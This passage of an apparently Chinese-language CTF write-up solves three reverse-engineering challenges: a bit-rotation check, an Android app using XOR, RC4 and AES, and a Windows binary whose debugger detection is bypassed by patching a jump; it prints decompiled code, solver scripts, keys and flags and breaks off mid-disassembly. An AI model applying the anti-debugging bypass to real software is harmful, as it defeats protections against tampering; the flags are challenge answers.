<p>部分会将输入的每个字符右移<font color=red><strong>dword_60004040</strong></font>位和左移<font color=red><strong>8 - dword_60004040</strong></font>位的两个值进行按位或运算（即<font color=red><strong>byte_60004080&#x3D;(dword_60004040≫3)∣(dword_60004040≪5)</strong></font>），并将结果储存在<font color=red><strong>byte_60004080</strong></font>中，之后会将<font color=red><strong>byte_60004080</strong></font>与<font color=red><strong>byte_60004020</strong></font>进行比较，全部相符即为正确，查看得知<font color=red><strong>byte_60004020</strong></font>的值为<font color=lime><strong>[0xCC, 0x8D, 0x2C, 0xEC, 0x6F, 0x88, 0xED, 0xEB, 0x2F, 0xED, 0xAE, 0xEB, 0x4E, 0xAC, 0x2C, 0x8D, 0x8D, 0x2F, 0xEB, 0x6D, 0xCD, 0xED, 0xEE, 0xEB, 0x0E, 0x8E, 0x4E, 0x2C, 0x6C, 0xAC, 0xE7, 0xAF]</strong></font>，编写python代码解得flag为<font color=deepskyblue><strong>flag{Do_you_really_know_ptrace?}</strong></font>.</p>
<p>附：python代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">reverse</span>(<span class="params">x</span>):</span><br><span class="line">  <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    <span class="keyword">if</span> ((y &gt;&gt; <span class="number">3</span>) | (y &lt;&lt; <span class="number">5</span>)) &amp; <span class="number">0xFF</span> == x:</span><br><span class="line">      <span class="keyword">return</span> y</span><br><span class="line">z = [<span class="number">0xCC</span>, <span class="number">0x8D</span>, <span class="number">0x2C</span>, <span class="number">0xEC</span>, <span class="number">0x6F</span>, <span class="number">0x88</span>, <span class="number">0xED</span>, <span class="number">0xEB</span>, <span class="number">0x2F</span>, <span class="number">0xED</span>, <span class="number">0xAE</span>, <span class="number">0xEB</span>, <span class="number">0x4E</span>, <span class="number">0xAC</span>, <span class="number">0x2C</span>, <span class="number">0x8D</span>, <span class="number">0x8D</span>, <span class="number">0x2F</span>, <span class="number">0xEB</span>, <span class="number">0x6D</span>, <span class="number">0xCD</span>, <span class="number">0xED</span>, <span class="number">0xEE</span>, <span class="number">0xEB</span>, <span class="number">0x0E</span>, <span class="number">0x8E</span>, <span class="number">0x4E</span>, <span class="number">0x2C</span>, <span class="number">0x6C</span>, <span class="number">0xAC</span>, <span class="number">0xE7</span>, <span class="number">0xAF</span>]</span><br><span class="line">flag = []</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> z:</span><br><span class="line">  y = reverse(x)</span><br><span class="line">  flag.append(y)</span><br><span class="line">flag_str = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(y) <span class="keyword">for</span> y <span class="keyword">in</span> flag)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;flag_str&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="ezencrypt："><a href="#ezencrypt：" class="headerlink" title="ezencrypt："></a>ezencrypt：</h3><p>下载后发现是安卓应用程序，先用jadx打开分析主activity，发现是要输入值，然后把输入的东西交给<code>enc</code>类去处理，然后再拿<code>enc</code>处理过的输入进行检验，观察enc类发现其主要有以下几个功能：1.检验：调用本地方法 <code>doEncCheck</code> 来检验 <code>this.enc</code> 是否正确。2.生成密钥（stringToKey）:将字符串 <code>keyStr</code> 转换为字节数组，生成 <code>SecretKeySpec</code> 作为密钥，其中<code>this.enc</code>与<code>MainActivity.title</code>有关（<code>MainActivity.title = &quot;IamEzEncryptGame&quot;</code>）。3.加密：将输入的字符串转换为字节数组，用 <code>secretKey</code> 进行加密，再用 Base64 编码转换为字符串。4.解密：先将 Base64 编码的字符串解码为字节数组，再使用 secretKey 进行解密转换为字符串。发现不知道<code>doEncCheck</code>是什么，于是提取.so文件，用IDA反编译，找到起始的<font color=red><strong>Java_work_pangbai_ezencrypt_Enc_doEncCheck</strong></font>检验函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">Java_work_pangbai_ezencrypt_Enc_doEncCheck</span><span class="params">(__int64 a1, __int64 a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-114h]</span></span><br><span class="line">  __int64 StringUTFChars; <span class="comment">// [rsp+38h] [rbp-E8h]</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">200</span>]; <span class="comment">// [rsp+50h] [rbp-D0h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v9; <span class="comment">// [rsp+118h] [rbp-8h]</span></span><br><span class="line">  v9 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  StringUTFChars = _JNIEnv::GetStringUTFChars(a1, a3, <span class="number">0LL</span>);</span><br><span class="line">  __strcpy_chk(s, StringUTFChars, <span class="number">200LL</span>);</span><br><span class="line">  _JNIEnv::ReleaseStringUTFChars(a1, a3, StringUTFChars);</span><br><span class="line">  enc(s);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">44</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( s[i] != mm[i] )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>观察发现是将被enc处理后的s数组（输入的数组）与mm进行比较来得到结果，双击mm数组得到其值<font color=lime><strong>[0xC2, 0x6C, 0x73, 0xF4, 0x3A, 0x45, 0x0E, 0xBA, 0x47, 0x81, 0x2A, 0x26, 0xF6, 0x79, 0x60, 0x78, 0xB3, 0x64, 0x6D, 0xDC, 0xC9, 0x04, 0x32, 0x3B, 0x9F, 0x32, 0x95, 0x60, 0xEE, 0x82, 0x97, 0xE7, 0xCA, 0x3D, 0xAA, 0x95, 0x76, 0xC5, 0x9B, 0x1D, 0x89, 0xDB, 0x98, 0x5D]</strong></font>，再观察<code>enc</code>函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">enc</span><span class="params">(<span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+4h] [rbp-1Ch]</span></span><br><span class="line">  v3 = __strlen_chk(a1, <span class="number">-1LL</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v3; ++i )</span><br><span class="line">    a1[i] ^= xork[i % <span class="number">4</span>];</span><br><span class="line">  <span class="keyword">return</span> encc(xork, a1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>观察发现<code>enc</code>函数为输入值与<code>xork</code>字符串的循环异或，之后找到<code>xork</code>数组是<code>&quot;meow&quot;</code>，又找到<code>encc</code>函数如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">encc</span><span class="params">(<span class="type">char</span> *a1, <span class="type">char</span> *a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// rcx</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v4; <span class="comment">// [rsp+Ch] [rbp-34h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+14h] [rbp-2Ch]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+18h] [rbp-28h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-24h]</span></span><br><span class="line">  init_sbox(a1);</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = __strlen_chk((__int64)a2, <span class="number">-1LL</span>);</span><br><span class="line">    result = i;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= v2 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v6 = (v6 + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">    v5 = (sbox[v6] + v5) % <span class="number">256</span>;</span><br><span class="line">    v4 = sbox[v6];</span><br><span class="line">    sbox[v6] = sbox[v5];</span><br><span class="line">    sbox[v5] = v4;</span><br><span class="line">    a2[i] ^= sbox[(sbox[v5] + sbox[v6]) % <span class="number">256</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中a1是<code>xork</code>，a2是循环异或后的输入值，接下来又进行了类似RC4的加密。<br><br>分析得出总的逻辑链条：输入值会被带进enc的生成方法（作为string v），之后this.enc &#x3D; encrypt（输入值， stringTokey（”IamEzEncryptGame”）），而encrypt函数则是先将1与key进行AES加密，然后再把输入值带进去加密，之后this.enc会被带进check进行检验，而这部分在.so文件内完成，this.enc会被存入s数组并在.so文件内执行文件内的enc函数，先与xork（也就是”meow”）进行循环异或，再返回xork和a1带入encc函数的值，而encc函数则会进行可逆的RC4加密，在i大于等于v2（也就是a2的长度，enc中a1的长度，检验函数中s的长度（应当与mm相等，是44））之后跳出循环，返回循环的次数（也就是应当输入字符串的长度44，是定值），同理enc也会返回44，虽然enc（s）的运算结果并没有对任何变量进行赋值，但是在此过程中this.enc已经被改变，进行了循环异或又进行了RC4加密，才与mm（也就是<font color=lime><strong>[0xC2, 0x6C, 0x73, 0xF4, 0x3A, 0x45, 0x0E, 0xBA, 0x47, 0x81, 0x2A, 0x26, 0xF6, 0x79, 0x60, 0x78, 0xB3, 0x64, 0x6D, 0xDC, 0xC9, 0x04, 0x32, 0x3B, 0x9F, 0x32, 0x95, 0x60, 0xEE, 0x82, 0x97, 0xE7, 0xCA, 0x3D, 0xAA, 0x95, 0x76, 0xC5, 0x9B, 0x1D, 0x89, 0xDB, 0x98, 0x5D]</strong></font>）进行比较，基于此进行逐步逆向，先将mm逆向回到RC4之前：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">init_sbox</span>(<span class="params">key</span>):</span><br><span class="line">  sbox = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">  j = <span class="number">0</span></span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    j = (j + sbox[i] + key[i % <span class="built_in">len</span>(key)]) % <span class="number">256</span></span><br><span class="line">    sbox[i], sbox[j] = sbox[j], sbox[i]</span><br><span class="line">  <span class="keyword">return</span> sbox</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reverse_encc</span>(<span class="params">mm, sbox</span>):</span><br><span class="line">  i = <span class="number">0</span></span><br><span class="line">  j = <span class="number">0</span></span><br><span class="line">  text = []</span><br><span class="line">  <span class="keyword">for</span> byte <span class="keyword">in</span> mm:</span><br><span class="line">    i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">    j = (j + sbox[i]) % <span class="number">256</span></span><br><span class="line">    sbox[i], sbox[j] = sbox[j], sbox[i]</span><br><span class="line">    k = sbox[(sbox[i] + sbox[j]) % <span class="number">256</span>]</span><br><span class="line">    text.append(byte ^ k)</span><br><span class="line">  <span class="keyword">return</span> text</span><br><span class="line">key = <span class="string">b&#x27;meow&#x27;</span></span><br><span class="line">sbox = init_sbox(key)</span><br><span class="line">mm = [<span class="number">0xC2</span>, <span class="number">0x6C</span>, <span class="number">0x73</span>, <span class="number">0xF4</span>, <span class="number">0x3A</span>, <span class="number">0x45</span>, <span class="number">0x0E</span>, <span class="number">0xBA</span>, <span class="number">0x47</span>, <span class="number">0x81</span>, <span class="number">0x2A</span>,</span><br><span class="line">      <span class="number">0x26</span>, <span class="number">0xF6</span>, <span class="number">0x79</span>, <span class="number">0x60</span>, <span class="number">0x78</span>, <span class="number">0xB3</span>, <span class="number">0x64</span>, <span class="number">0x6D</span>, <span class="number">0xDC</span>, <span class="number">0xC9</span>, <span class="number">0x04</span>,</span><br><span class="line">      <span class="number">0x32</span>, <span class="number">0x3B</span>, <span class="number">0x9F</span>, <span class="number">0x32</span>, <span class="number">0x95</span>, <span class="number">0x60</span>, <span class="number">0xEE</span>, <span class="number">0x82</span>, <span class="number">0x97</span>, <span class="number">0xE7</span>, <span class="number">0xCA</span>,</span><br><span class="line">      <span class="number">0x3D</span>, <span class="number">0xAA</span>, <span class="number">0x95</span>, <span class="number">0x76</span>, <span class="number">0xC5</span>, <span class="number">0x9B</span>, <span class="number">0x1D</span>, <span class="number">0x89</span>, <span class="number">0xDB</span>, <span class="number">0x98</span>, <span class="number">0x5D</span>]</span><br><span class="line">text = reverse_encc(mm, sbox)</span><br><span class="line">text2 = [<span class="string">&#x27;0x&#123;:02X&#125;&#x27;</span>.<span class="built_in">format</span>(byte) <span class="keyword">for</span> byte <span class="keyword">in</span> text]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[&#x27;</span>, <span class="string">&#x27;, &#x27;</span>.join(text2), <span class="string">&#x27;]&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>计算得<font color=lime><strong>mm_beforeRC4_after_xor &#x3D; [0x5F, 0x27, 0x2D, 0x5C, 0x2A, 0x34, 0x0E, 0x1A, 0x1D, 0x2E, 0x02, 0x04, 0x1F, 0x03, 0x2B, 0x30, 0x55, 0x50, 0x44, 0x47, 0x2C, 0x52, 0x01, 0x46, 0x55, 0x28, 0x44, 0x1C,0x39, 0x57, 0x15, 0x35, 0x29, 0x0C, 0x35, 0x24, 0x22, 0x57, 0x57, 0x3E, 0x0E, 0x0D, 0x5B, 0x4A]</strong></font>，再逆向回到异或之前：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mm = [<span class="number">0x5F</span>, <span class="number">0x27</span>, <span class="number">0x2D</span>, <span class="number">0x5C</span>, <span class="number">0x2A</span>, <span class="number">0x34</span>, <span class="number">0x0E</span>, <span class="number">0x1A</span>, <span class="number">0x1D</span>, <span class="number">0x2E</span>, <span class="number">0x02</span>,</span><br><span class="line">      <span class="number">0x04</span>, <span class="number">0x1F</span>, <span class="number">0x03</span>, <span class="number">0x2B</span>, <span class="number">0x30</span>, <span class="number">0x55</span>, <span class="number">0x50</span>, <span class="number">0x44</span>, <span class="number">0x47</span>, <span class="number">0x2C</span>, <span class="number">0x52</span>,</span><br><span class="line">      <span class="number">0x01</span>, <span class="number">0x46</span>, <span class="number">0x55</span>, <span class="number">0x28</span>, <span class="number">0x44</span>, <span class="number">0x1C</span>, <span class="number">0x39</span>, <span class="number">0x57</span>, <span class="number">0x15</span>, <span class="number">0x35</span>, <span class="number">0x29</span>,</span><br><span class="line">      <span class="number">0x0C</span>, <span class="number">0x35</span>, <span class="number">0x24</span>, <span class="number">0x22</span>, <span class="number">0x57</span>, <span class="number">0x57</span>, <span class="number">0x3E</span>, <span class="number">0x0E</span>, <span class="number">0x0D</span>, <span class="number">0x5B</span>, <span class="number">0x4A</span>]</span><br><span class="line">xork = <span class="string">b&#x27;meow&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">44</span>):</span><br><span class="line">mm[i] ^= xork[i % <span class="number">4</span>]</span><br><span class="line">mm = [<span class="string">f&#x27;0x<span class="subst">&#123;byte:02X&#125;</span>&#x27;</span> <span class="keyword">for</span> byte <span class="keyword">in</span> mm]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[&#x27;</span>, <span class="string">&#x27;, &#x27;</span>.join(mm), <span class="string">&#x27;]&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>得到<font color=lime><strong>this.enc &#x3D;[0x32, 0x42, 0x42, 0x2B, 0x47, 0x51, 0x61, 0x6D, 0x70, 0x4B, 0x6D, 0x73, 0x72, 0x66, 0x44, 0x47, 0x38, 0x35, 0x2B, 0x30, 0x41, 0x37, 0x6E, 0x31, 0x38, 0x4D, 0x2B, 0x6B, 0x54, 0x32, 0x7A, 0x42, 0x44, 0x69, 0x5A, 0x53, 0x4F, 0x32, 0x38, 0x49, 0x63, 0x68, 0x34, 0x3D]</strong></font>，转换得<font color=lime><strong>2BB+GQampKmsrfDG85+0A7n18M+kT2zBDiZSO28Ich4&#x3D;</strong></font>，再带回AES解密（<font color=LimeGreen><strong>key&#x3D;IamEzEncryptGame</strong></font>）得<font color=deepskyblue><strong>flag{0hh_U_kn0w_7h15_5ki11}</strong></font>.</p>
<h3 id="PangBai-泰拉记（1）："><a href="#PangBai-泰拉记（1）：" class="headerlink" title="PangBai 泰拉记（1）："></a>PangBai 泰拉记（1）：</h3><p>反编译后静态分析发现main函数内说<code>Use your debugger to discover the hidden flag!</code>和<code>Click on the flag to obtain?</code>但经过检查，发现加密的步骤居然只有<code>for ( i = 0; i &lt; 32; ++i )&#123;flag[i] ^= key[i];&#125;</code>一步，猜测题目并没有这么简单，点开查看flag和key之后输入进python进行异或操作发现输出的是乱码，而flag本身对应的是<code>can you find me can you find me?</code>，提示还需要再找，于是尝试进行动态调试，运行程序发现报错，缺少四个dll文件：VCRUNTIME140D.dll、VCRUNTIME140_1D.dll、ucrtbased.dll和MSVCP140D.dll，去网络上搜索这些dll文件并下载放在同目录中，发现程序不再报错，进行动态调试，在退出前设置断点，在暂停时得到了一串新的key和flag，带入运行却发现输出<font color=red><strong>flag{I_m_wrong_flag_dont_submit}</strong></font>，说明flag还是不对，再次详细观察发现还有一个<code>main0</code>函数，在运行过程中多次检测了是否正处于调试状态（如<font color=violet><strong>j___CheckForDebuggerJustMyCode</strong></font>、<font color=violet><strong>CheckRemoteDebuggerPresent</strong></font>、<font color=violet><strong>IsDebuggerPresent</strong></font>等等），得知应当绕过这些反调试机制，总的程序流程应该是<font color=violet><strong>j___CheckForDebuggerJustMyCode</strong></font>→<code>main0</code>上半段→<code>main0</code>（<font color=violet><strong>j___CheckForDebuggerJustMyCode</strong></font>）→<code>main0</code>（<font color=violet><strong>CheckRemoteDebuggerPresent(m1a0, &amp;miao);</strong></font>）→<font color=violet><strong>if ( miao | IsDebuggerPresent()</strong></font> )如果检测到正在调试，就修改<code>aaa</code>并将key与aaa进行错误的异或，否则修改v5和v6并将key与v5进行正确的异或，再将flag和key进行异或得到结果，基于此要么在所有<font color=violet><strong>CheckRemoteDebuggerPresent</strong></font>执行时将<code>&amp;miao</code>改为0（false）和在所有<font color=violet><strong>IsDebuggerPresent</strong></font>函数执行时将其返回值patch为0，要么找到对应的反汇编代码并改动跳转条件：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span>00007FF670C22B8A                 <span class="keyword">call</span>    <span class="built_in">cs</span>:__imp_CheckRemoteDebuggerPresent</span><br><span class="line"><span class="symbol">.text:</span>00007FF670C22B90                 <span class="keyword">call</span>    <span class="built_in">cs</span>:__imp_IsDebuggerPresent</span><br><span class="line"><span class="symbol">.text:</span>00007FF670C22B96                 <span class="keyword">or</span>      <span class="built_in">eax</span>, <span class="built_in">cs</span>:?miao@@3HA <span class="comment">; int miao</span></span><br><span class="line"><span class="symbol">.text:</span>00007FF670C22B9C                 <span class="keyword">test</span>    <span class="built_in">eax</span>, <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>00007FF670C22B9E                 <span class="keyword">jz</span>     loc_7FF670C22C6A</span><br></pre></td></tr></table></figure>
<p>将jz改为jnz（右键patch修改byte将机器码0F 84改为0F 85），观察发现接下来是key与</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span>00007FF670C22C6A <span class="comment">; ---------------------------------------------------------------------------</span></span><br><span class="line"><span class="symbol">.text:</span>00007FF670C22C6A</span><br><span class="line"><span class="symbol">.text:</span>00007FF670C22C6A loc_7FF670C22C6A:                       <span class="comment">; CODE XREF: main0(void)+4E↑j</span></span><br><span class="line"><span class="symbol">.text:</span>00007FF670C22C6A                 <span class="keyword">mov</span>     [<span class="built_in">rbp</span>+<span class="number">190h</span>+var_128], <span class="number">6Eh</span> <span class="comment">; &#x27;n&#x27;</span></span><br><span class="line"><span class="symbol">.text:</span>00007FF670C22C6E                 <span class="keyword">mov</span>     [<span class="built_in">rbp</span>+<span class="number">190h</span>+var_127], <span class="number">68h</span> <span class="comment">; &#x27;h&#x27;</span></span><br><span class="line"><span class="symbol">.text:</span>00007FF670C22C72                 <span class="keyword">mov</span>     [<span class="built_in">rbp</span>+<span class="number">190h</span>+var_126], <span class="number">76h</span> <span class="comment">; &#x27;v&#x27;</span></span><br><span class="line"><span class="symbol">.text:</span>00007FF670C22C76                 <span class="keyword">mov</span>     [<span class="built_in">rbp</span>+<span class="number">190h</span>+var_125], <span class="number">76h</span> <span class="comment">; &#x27;v&#x27;</span></span><br><span class="line"><span class="symbol">.text:</span>00007FF670C22C7A                 <span class="keyword">mov</span>     [<span class="built_in">rbp</span>+<span class="number">190h</span>+var_124], <span class="number">69h</span> <span class="comment">; &#x27;i&#x27;</span></span><br><span class="line"><span class="symbol">.text:</span>00007FF670C22C7E                 <span class="keyword">mov</span>     [<span class="built_in">rbp</span>+<span class="number">190h</span>+var_123], <span class="number">67h</span> <span class="comment">; &#x27;g&#x27;</span></span><br><span class="line"><span class="symbol">.text:</span>00007FF670C22C82                 <span class="keyword">mov</span>     [<span class="built_in">rbp</span>+<span class="number">190h</span>+var_122], <span class="number">75h</span> <span class="comment">; &#x27;u&#x27;</span></span><br><span class="line"><span class="symbol">.text:</span>00007FF670C22C86                 <span class="keyword">mov</span>     [<span class="built_in">rbp</span>+<span class="number">190h</span>+var_121], <span class="number">4Dh</span> <span class="comment">; &#x27;M&#x27;</span></span><br><span class="line"><span class="symbol">.text:</span>00007FF670C22C8A                 <span class="keyword">mov</span>     [<span class="built_in">rbp</span>+<span class="number">190h</span>+var_120], <span class="number">49h</span> <span class="comment">; &#x27;I&#x27;</span></span><br><span class="line"><span class="symbol">.text:</span>00007FF670C22C8E                 <span class="keyword">mov</span>     [<span class="built_in">rbp</span>+<span class="number">190h</span>+var_11F], <span class="number">3Fh</span> <span class="comment">; &#x27;?&#x27;</span></span><br><span class="line"><span class="symbol">.text:</span>00007FF670C22C92                 <span class="keyword">mov</span>     [<span class="built_in">rbp</span>+<span class="number">190h</span>+var_11E], <span class="number">75h</span> <span class="comment">; &#x27;u&#x27;</span></span><br><span class="line"><span class="symbol">.text:</span>00007FF670C22C96                 <span class="keyword">mov</span>     [<span class="built_in">rbp</span>+<span class="number">190h</span>+var_11D], <span class="number">22h</span> <span class="comment">; &#x27;&quot;&#x27;</span></span><br><span class="line"><span class="symbol">.text:</span>00007FF670C22C9A                 <span class="keyword">mov</span>     [<span class="built_in">rbp</span>+<span class="number">190h</span>+var_11C], <span class="number">2Ch</span> <span class="comment">; &#x27;,&#x27;</span></span><br><span class="line"><span class="symbol">.text:</span>00007FF670C22C9E                 <span class="keyword">mov</span>     [<span class="built_in">rbp</span>+<span class="number">190h</span>+var_11B], <span class="number">6Fh</span> <span class="comment">; &#x27;o&#x27;</span></span><br><span class="line"><span class="symbol">.text:</span>00007FF670C22CA2                 <span class="keyword">mov</span>     [<span class="built_in">rbp</span>+<span class="number">190h</span>+var_11A], <span class="number">2Fh</span> <span class="comment">; &#x27;/&#x27;</span></span><br><span class="line"><span class="symbol">.text:</span>00007FF670C22CA6                 <span class="keyword">mov</span>     [<span class="built_in">rbp</span>+<span class="number">190h</span>+var_119], <span class="number">66h</span> <span class="comment">; &#x27;f&#x27;</span></span><br><span class="line"><span class="symbol">.text:</span>00007FF670C22CAA                 <span class="keyword">mov</span>     [<span class="built_in">rbp</span>+<span class="number">190h</span>+var_118], <span class="number">57h</span> <span class="comment">; &#x27;W&#x27;</span></span><br><span class="line"><span class="symbol">.text:</span>00007FF670C22CAE                 <span class="keyword">mov</span>     [<span class="built_in">rbp</span>+<span class="number">190h</span>+var_117], <span class="number">69h</span> <span class="comment">; &#x27;i&#x27;</span></span><br><span class="line"><span class="symbol">.text:</span>00007FF670C22CB2                 <span class="keyword">mov</span>     [<span class="built_in">rbp</span>+<span class="number">190h</span>+var_116], <span class="number">76h</span> <span class="comment">; &#x27;v&#x27;</span></span><br><span class="line"><span class="symbol">.text:</span>00007FF670C22CB6                 <span class="keyword">mov</span>     [<span class="built_in">rbp</span>+<span class="number">190h</span>+var_115], <span class="number">6Fh</span> <span class="comment">; &#x27;o&#x27;</span></span><br><span class="line"><span class="symbol">.text:</span>00007FF670C22CBA                 <span class="keyword">mov</span>     [<span class="built_in">rbp</span>+<span class="number">190h</span>+var_114], <span class="number">4Dh</span> <span class="comment">; &#x27;M&#x27;</span></span><br><span class="line"><span class="symbol">.text:</span>00007FF670C22CBE                 <span class="keyword">mov</span>     [<span class="built_in">rbp</span>+<span class="number">190h</span>+var_113], <span class="number">3Bh</span> <span class="comment">; &#x27;;&#x27;</span></span><br><span class="line"><span class="symbol">.text:</span>00007FF670C22CC2                 <span class="keyword">mov</span>     [<span class="built_in">rbp</span>+<span class="number">190h</span>+var_112], <span class="number">7Fh</span></span><br><span class="line"><span class="symbol">.text:</span>00007FF670C22CC6                 <span class="keyword">mov</span>     [<span class="built_in">rbp</span>+<span class="number">190h</span>+var_111], <span class="number">48h</span> <span class="comment">; &#x27;H&#x27;</span></span><br><span class="line"><span class="symbol">.text:</span>00007FF670C22CCA                 <span class="keyword">mov</span>     [<span class="built_in">rbp</span>+<span class="number">190h</span>+var_110], <span class="number">6Fh</span> <span class="comment">; &#x27;o&#x27;</span></span><br><span class="line"><span class="symbol">.text:</span>00007FF670C22CD1                 <span class="keyword">mov</span>     [<span class="built_in">rbp</span>+<span class="number">190h</span>+var_10F], <span class="number">6Dh</span> <span class="comment">; &#x27;m&#x27;</span></span><br><span class="line"><span 